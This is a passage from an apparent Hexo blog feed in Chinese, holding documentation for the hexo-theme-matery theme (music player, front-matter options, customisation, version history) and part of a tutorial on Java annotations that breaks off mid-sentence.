operator">:</span> <span class="token string">"AnimeVibe"</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music1.mp3"</span><span class="token punctuation">,</span><span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover1.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Take me hand"</span><span class="token punctuation">,</span><span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"DAISHI DANCE,Cecile Corbel"</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"/medias/music/music2.mp3"</span><span class="token punctuation">,</span><span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"/medias/music/cover2.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Shape of You"</span><span class="token punctuation">,</span><span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"J.Fla"</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music3.mp3"</span><span class="token punctuation">,</span><span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover3.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：以上 JSON 中的属性：<code>name</code>、<code>artist</code>、<code>url</code>、<code>cover</code> 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p></blockquote><p>然后，在主题的 <code>_config.yml</code> 配置文件中激活配置即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># 是否在首页显示音乐.</span><span class="token key atrule">music</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">showTitle</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">title</span><span class="token punctuation">:</span> 听听音乐  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 是否开启吸底模式</span>  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 是否自动播放</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'#42b983'</span>  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span> <span class="token comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'list'</span> <span class="token comment"># 音频循环顺序, 可选值: 'list', 'random'</span>  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span> <span class="token comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7</span> <span class="token comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 列表默认折叠</span>  <span class="token key atrule">listMaxHeight</span><span class="token punctuation">:</span> <span class="token comment"># 列表最大高度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> 赵奇<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="https://statics.sh1a.qingstor.com/2018/12/02/matery-20181202-1.png" alt="首页"></p><p><img src="https://statics.sh1a.qingstor.com/2018/12/02/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="https://statics.sh1a.qingstor.com/2018/12/02/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="https://statics.sh1a.qingstor.com/2018/12/02/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="https://statics.sh1a.qingstor.com/2018/12/02/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector">.bg-color</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> #4cbf30 0%<span class="token punctuation">,</span> #0f9d58 100%<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本记录"><a href="#版本记录" class="headerlink" title="版本记录"></a>版本记录</h2><ul><li>v1.0.0<ul><li>新增了所有基础功能；</li></ul></li><li>v1.0.1<ul><li>调整 <code>css</code>、<code>js</code> 的文件请求路径在主题的<code>_config.yml</code>中配置，便于你更快捷的配置自己的 CDN；</li><li>新增代码是否折行为可配置，默认为折行；</li><li>默认激活 <code>TOC</code> 功能，并新增为某篇文章关闭 <code>TOC</code> 的 <code>Front-matter</code> 配置选项；</li><li>修复文章滚动时，高亮的目录选项不准确的问题；</li><li><code>IOS</code>下移除搜索框自动获得焦点属性，防止自动获得焦点后导致视图上移；</li></ul></li><li>v1.0.2<ul><li>升级了 <a href="https://materializecss.com/">Materialize</a> 框架版本为<code>1.0.0</code>，重构和修改了升级过程中的部分文件或问题；</li><li>新增了首页封面的全屏轮播特效，可以将更重要的文章设置到首页轮播中；</li><li>修复首页第一个按钮是中文的问题</li><li>修复了 iPhone 上点击搜索输入获取焦点的问题；</li><li>修复了 iPhone 上输入框获取焦点后页面放大的问题；</li><li>修复一些文章或 UI 显示问题；</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> hexo-theme-matery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java注解的理解和应用</title>
      <link href="/2018/11/08/hou-duan/java-zhu-jie-de-li-jie-he-ying-yong/"/>
      <url>/2018/11/08/hou-duan/java-zhu-jie-de-li-jie-he-ying-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="1-什么是注解"><a href="#1-什么是注解" class="headerlink" title="1. 什么是注解"></a>1. 什么是注解</h3><p>注解(<code>Annotation</code>)是一种应用于类、方法、参数、变量、构造器及包声明中的特殊修饰符，它是一种由JSR-175标准选择用来描述元数据的一种工具。Java从<code>Java5</code>开始引入了注解。在注解出现之前，程序的元数据只是通过java注释和javadoc，但是注解提供的功能要远远超过这些。注解不仅包含了元数据，它还可以作用于程序运行过程中、注解解释器可以通过注解决定程序的执行顺序。</p><p>比如，下面这段代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"This is String."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码中，我重写了<code>toString()</code>方法并使用了<code>@Override</code>注解。但是，即使我们不使用<code>@Override</code>注解标记代码，程序也能够正常执行。那么，该注解表示什么？这么写有什么好处吗？事实上，<code>@Override</code>告诉编译器这个方法是一个重写方法(描述方法的元数据)，如果父类中不存在该方法，编译器便会报错，提示该方法没有重写父类中的方法。如果我不小心拼写错误，例如将<code>toString()</code>写成了<code>toStrring()&#123;double r&#125;</code>，而且我也没有使用<code>@Override</code>注解，那程序依然能编译运行。但运行结果会和我期望的大不相同。现在我们了解了什么是注解，并且使用注解有助于阅读程序。</p><h3 id="2-为什么要引入注解"><a href="#2-为什么要引入注解" class="headerlink" title="2. 为什么要引入注解"></a>2. 为什么要引入注解</h3><p>使用注解之前(甚至在使用之后)，XML被广泛的应用于描述元数据。不知何时开始一些应用开发人员和架构师发现XML的维护越来越糟糕了。他们希望使用一些和代码紧耦合的东西，而不是像XML那样和代码是松耦合的(在某些情况下甚至是完全分离的)代码描述。如果你在Google中搜索“XML vs. annotations”，会看到许多关于这个问题的辩论。最有趣的是XML配置其实就是为了分离代码和配置而引入的。上述两种观点可能会让你很疑惑，两者观点似乎构成了一种循环，但各有利弊。下面我们通过一个例子来理解这两者的区别。</p><p>假如你想为应用设置很多的常量或参数，这种情况下，XML是一个很好的选择，因为它不会同特定的代码相连。如果你想把某个方法声明为服务，那么使用注解会更好一些，因为这种情况下需要注解和方法紧密耦合起来，开发人员也必须认识到这点。</p><p>另一个很重要的因素是注解定义了一种标准的描述元数据的方式。在这之前，开发人员通常使用他们自己的方式定义元数据。例如，使用标记接口，注释，<code>transient</code>关键字等等。每个程序员按照自己的方式定义元数据，而不像注解这种标准的方式。</p><p>目前，许多框架将<code>XML</code>和<code>Annotation</code>两种方式结合使用，平衡两者之间的利弊。</p><h2 id="Java基本注解"><a href="#Java基本注解" class="headerlink" title="Java基本注解"></a>Java基本注解</h2><p>在<code>java.lang</code>包下，JAVA提供了5个基本注解。</p><h3 id="1-Override"><a href="#1-Override" class="headerlink" title="1. @Override"></a>1. @Override</h3><p><code>@Override</code>用于标注重写了父类的方法。对于子类中被<code>@Override</code>修饰的方法，如果存在对应的被重写的父类方法，则正确；如果不存在，则报错。<code>@Override</code>只能作用于方法，不能作用于其他程序元素。</p><h3 id="2-Deprecated"><a href="#2-Deprecated" class="headerlink" title="2. @Deprecated"></a>2. @Deprecated</h3><p><code>@Deprecated</code>用于表示某个程序元素（类、方法等）已过时。如果使用了被<code>@Deprecated</code>修饰的类或方法等，编译器会发出警告。</p><h3 id="3-SuppressWarnings"><a href="#3-SuppressWarnings" class="headerlink" title="3. @SuppressWarnings"></a>3. @SuppressWarnings</h3><p><code>@SuppressWarnings</code>用于抑制编译器的警告。指示被<code>@SuppressWarnings</code>修饰的程序元素（以及该程序元素中的所有子元素，例如类以及该类中的方法）取消显示指定的编译器警告。例如，常见的<code>@SuppressWarnings（value=&quot;unchecked&quot;）</code>。</p><p><code>SuppressWarnings</code>注解的常见参数值主要有以下几种：</p><ul><li><code>deprecation</code>：使用了不赞成使用的类或方法时的警告(使用<code>@Deprecated</code>使得编译器产生的警告)；</li><li><code>unchecked</code>：执行了未检查的转换时的警告，例如当使用集合时没有用泛型 (Generics) 来指定集合保存的类型; 关闭编译器警告</li><li><code>fallthrough</code>：当 Switch 程序块直接通往下一种情况而没有 Break 时的警告;</li><li><code>path</code>：在类路径、源文件路径等中有不存在的路径时的警告;</li><li><code>serial</code>：当在可序列化的类上缺少 serialVersionUID 定义时的警告;</li><li><code>finally</code>：任何 finally 子句不能正常完成时的警告;</li><li><code>all</code>：关于以上所有情况的警告。</li></ul><h3 id="4-SafeVarargs"><a href="#4-SafeVarargs" class="headerlink" title="4. @SafeVarargs"></a>4. @SafeVarargs</h3><p><code>@SafeVarargs</code>是JDK 7 专门为抑制<strong>堆污染</strong>警告提供的。</p><h3 id="5-FunctionalInterface"><a href="#5-FunctionalInterface" class="headerlink" title="5. @FunctionalInterface"></a>5. @FunctionalInterface</h3><p><code>@FunctionalInterface</code>是Java8中新增的函数式接口。Java8规定：如果接口中只有一个抽象方法（可以包含多个默认方法或多个<code>static</code>方法），该接口称为函数式接口。如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FunctionalInterface</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Fun</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"foo类方法"</span><span class="token punctuation">)</span>；    <span class="token punctuation">&#125;</span>    <span class="token keyword">default</span> <span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bar默认方法"</span><span class="token punctuation">)</span>；    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只定义了一个抽象方法</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：如在上面的接口中再加一个抽象方法<code>abc()</code>，则会编译出错。</p></blockquote><h2 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h2><p>**元注解(<code>meta-annotation</code>)**是指注解的注解。Java5定义了5个标准的元注解类型，它们被用来提供对其它注解的类型作说明。接下来介绍这五个元注解。</p><h3 id="1-Retention"><a href="#1-Retention" class="headerlink" title="1. @Retention"></a>1. @Retention</h3><p><code>@Retention</code>指明了该注解被保留的时间长短。包含一个名为<code>value</code>的成员变量，该value成员变量是<code>RetentionPolicy</code>枚举类型。使用<code>@Retention</code>时，必须为其value指定值。value成员变量的值只能是如下3个：</p><ul><li><code>SOURCE</code>：只保留在源代码中，编译器编译时，直接丢弃这种注解，不记录在<code>.class</code>文件中。</li><li><code>CLASS</code>：编译器把注解记录在<code>class</code>文件中。当运行Java程序时，JVM中不可获取该注解信息，这是默认值。</li><li><code>RUNTIME</code>：编译器把注解记录在<code>class</code>文件中。当运行Java程序时，JVM可获取该注解信息，程序可以通过反射获取该注解的信息。</li></ul><h3 id="2-Target"><a href="#2-Target" class="headerlink" title="2. @Target"></a>2. @Target</h3><p><code>@Target</code>指定注解用于修饰哪些程序元素。<code>@Target</code>也包含一个名为<code>value</code>的成员变量，该value成员变量类型为<code>ElementType[]</code>，<code>ElementType</code>也为枚举类型，值有如下几个：</p><ul><li><code>TYPE</code>：修饰类、接口或枚举类型</li><li><code>FIELD</code>：修饰成员变量（包括枚举常量）</li><li><code>METHOD</code>：修饰方法</li><li><code>PARAMETER</code>：修饰参数</li><li><code>CONSTRUCTOR</code>：修饰构造器</li><li><code>LOCAL_VARIABLE</code>：修饰局部变量</li><li><code>ANNOTATION_TYPE</code>：修饰注解</li><li><code>PACKAGE</code>：修饰包</li><li><code>TYPE_PARAMETER</code>：Java8新增，修饰类型参数。</li><li><code>TYPE_USE</code>：Java8新增，可以在任何类型上使用</li></ul><h4 id="类型注解（Java8新增）"><a href="#类型注解（Java8新增）" class="headerlink" title="类型注解（Java8新增）"></a>类型注解（Java8新增）</h4><p>在 Java8 之前的版本中，只能允许在声明式前使用注解。而在 Java8 版本中，注解可以被用在任何使用 Type 的地方，例如：初始化对象时 (new)，对象类型转化时，使用 implements 表达式时，或者使用 throws 表达式时。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//初始化对象时</span><span class="token class-name">String</span> myString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token annotation punctuation">@NotNull</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//对象类型转化时</span>myString <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> <span class="token class-name">String</span><span class="token punctuation">)</span> str<span class="token punctuation">;</span><span class="token comment">//使用 implements 表达式时</span><span class="token keyword">class</span> <span class="token class-name">MyList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">implements</span> <span class="token annotation punctuation">@ReadOnly</span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token annotation punctuation">@ReadOnly</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span> <span class="token comment">//使用 throws 表达式时</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">validateValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token annotation punctuation">@Critical</span> <span class="token class-name">ValidationFailedException</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义一个类型的方法与普通的注解类似，只需要指定<code>Target</code>为<code>ElementType.TYPE_PARAMETER</code>或者<code>ElementType.TYPE_USE</code>，或者同时指定这两个<code>Target</code>。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span>  <span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnnotation</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>ElementType.TYPE_PARAMETER</code>表示这个注解可以用在 Type 的声明式前，而<code>ElementType.TYPE_USE</code>表示这个注解可以用在所有使用 Type 的地方（如：泛型，类型转换等）</p><p>与 Java 8 之前的注解类似的是，类型也可以通过设置 Retention 在编译后保留在 class 文件中（RetentionPolicy.CLASS）或者运行时可访问（RetentionPolicy.RUNTIME）。但是与之前不同的是，类型注解有两个新的特性：在本地变量上的注解可以保留在<code>class</code>文件中，以及泛型类型可以被保留甚至在运行时被访问。</p><p>虽然类型可以保留在 class 文件中，但是它并不会改变程序代码本身的行为。例如在一个方法前加上注解，调用此方法返回的结果和不加注解的时候一致。</p><p>Java8 通过引入类型，使得开发者可以在更多的地方使用注解，从而能够更全面地对代码进行分析以及进行更强的类型检查。</p><h3 id="3-Inherited"><a href="#3-Inherited" class="headerlink" title="3. @Inherited"></a>3. @Inherited</h3><p><code>@Inherited</code>指定注解具有继承性。如果某个类使用了<code>@xxx</code>注解（定义该注解时使用了<code>@Inherited</code>修饰）修饰，则其子类将自动被<code>@xxx</code>修饰。</p><h3 id="4-Documented"><a href="#4-Documented" class="headerlink" title="4. @Documented"></a>4. @Documented</h3><p>如果定义注解A时，使用了<code>@Documented</code>修饰定义，则在用Javadoc命令生成API文档后，所有使用注解A修饰的程序元素，将会包含注解A的说明。</p><h3 id="5-Repeatable（Java8新增）"><a href="#5-Repeatable（Java8新增）" class="headerlink" title="5. @Repeatable（Java8新增）"></a>5. @Repeatable（Java8新增）</h3><p><code>@Repeatable</code>表示可重复注解。在实际应用中，可能会出现需要对同一个声明式或者类型加上相同的注解（包含不同的属性值）的情况。例如系统中除了管理员之外，还添加了超级管理员这一权限，对于某些只能由这两种角色调用的特定方法，可以使用可重复注解。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Access</span><span class="token punctuation">(</span>role<span class="token operator">=</span><span class="token string">"SuperAdministrator"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Access</span><span class="token punctuation">(</span>role<span class="token operator">=</span><span class="token string">"Administrator"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Java8之前版本的 JDK 并不允许开发者在同一个声明式前加注同样的注解，（即使属性值不同）这样的代码在编译过程中会提示错误。而 Java8 